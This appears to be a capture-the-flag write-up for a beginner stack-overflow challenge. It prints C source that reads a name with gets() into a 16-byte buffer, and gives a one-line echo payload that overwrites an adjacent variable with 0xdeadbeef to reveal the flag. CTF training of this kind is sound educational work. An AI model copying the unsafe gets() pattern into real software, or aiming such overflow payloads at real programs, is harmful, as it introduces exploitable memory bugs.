# Binary Exploitation

Challenge Name : Overflow Me

# Solution

Use the webshell and go to the directory stated in the challenge's description

![[Pasted image 20210611183555.png]]

Before we run let's analyze the source code first.

```c
#include <stdio.h>                                                                                                                                                                              
#include <stdlib.h>                                                                                                                                                                             
#include <string.h>                                                                                                                                                                             
                                                                                                                                                                                                
#define FLAGSIZE_MAX 128                                                                                                                                                                        
                                                                                                                                                                                                
char flag[FLAGSIZE_MAX];                                                                                                                                                                        
                                                                                                                                                                                                
void setup(){                                                                                                                                                                                   
  FILE *f = fopen("flag.txt","r");                                                                                                                                                              
  fgets(flag,FLAGSIZE_MAX,f);                                                                                                                                                                   
  gid_t gid = getegid();                                                                                                                                                                        
  setresgid(gid, gid, gid);                                                                                                                                                                     
}                                                                                                                                                                                               
                                                                                                                                                                                                
                                                                                                                                                                                                
int main(int argc, char **argv){                                                                                                                                                                
  setup();                                                                                                                                                                                      
  int overflowMe = 0;                                                                                                                                                                           
  char name[16];                                                                                                                                                                                
  printf("Welcome to our second overflow challenge!\n");                                                                                                                                        
  printf("Please do not enter your name over 28 characters!\n");                                                                                                                                
  printf("Enter your name: ");                                                                                                                                                                  
  gets(name);                                                                                                                                                                                   
  if(overflowMe == 0xdeadbeef){                                                                                                                                                                 
        printf("Overflowwwww! Here's your flag: %s\n", flag);
  }                                                                                                                                                                                             
  else{                                                                                                                                                                                         
        printf("Good Bye %s\noverflowMe now is equal 0x%x (Hex) or %i (Decimal)\n",name,overflowMe,overflowMe);
  }                                                                                                                                                                                             
} return 0;
```

The same `gets()` in this challenge. So we just need to get the value of `overflowMe` will equal to `0xdeadbeef`. So first let's try to run it with multiple characters of `a`

![[Pasted image 20210611183805.png]]

We can just write a command to get our flag!

```bash
echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde" | ./overflow2
```

# Flag

![[Pasted image 20210611185120.png]]



